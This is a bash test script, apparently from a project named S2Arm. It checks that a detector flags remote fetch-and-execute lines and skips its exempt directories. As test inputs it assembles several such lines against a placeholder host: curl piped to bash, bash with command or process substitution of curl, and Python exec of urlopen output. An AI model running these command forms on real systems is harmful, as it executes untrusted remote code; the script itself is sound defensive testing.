#!/usr/bin/env bash
# SPDX-License-Identifier: Apache-2.0
# Copyright 2026 S2Arm contributors
# 门禁覆盖：tests/no_remote_exec_pipe_test.sh
set -eu
root=$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)
tmp=$(mktemp -d)
trap 'rm -rf "$tmp"' EXIT
mkdir -p "$tmp/tests" "$tmp/.git" "$tmp/compat/tree" "$tmp/compat" "$tmp/nested"
cp "$root/tests/no_remote_exec_pipe_test.sh" "$tmp/tests/"
fetch=curl
shell=bash
pipe='|'
bad="$fetch https://example.invalid/a $pipe $shell"
printf '%s\n' "$bad" > "$tmp/.git/a.sh"
printf '%s\n' "$bad" > "$tmp/compat/tree/a.sh"
bash "$tmp/tests/no_remote_exec_pipe_test.sh" "$tmp" >/dev/null
for path in a.sh a.py a.md a.cs a.swift a.m nested/a.sh compat/a.sh .git-example.sh tests/other.sh; do
  printf '%s\n' "$bad" > "$tmp/$path"
  result=$(bash "$tmp/tests/no_remote_exec_pipe_test.sh" "$tmp" 2>&1) && exit 1
  case "$result" in *"./$path:1:"*) ;; *) echo "missing $path"; exit 1;; esac
  rm "$tmp/$path"
done
url=https://example.invalid/a
execute=exec
reader=urlopen
for form in "$shell -c \"\$(${fetch} $url)\"" "$shell <($fetch $url)" "$fetch $url $pipe tee a $pipe $shell" "$execute($reader(\"$url\").read())"; do
  printf '%s\n' "$form" > "$tmp/nested/form.sh"
  bash "$tmp/tests/no_remote_exec_pipe_test.sh" "$tmp" >/dev/null && exit 1
  rm "$tmp/nested/form.sh"
done
bash "$tmp/tests/no_remote_exec_pipe_test.sh" "$tmp" >/dev/null
echo '16 cases passed'
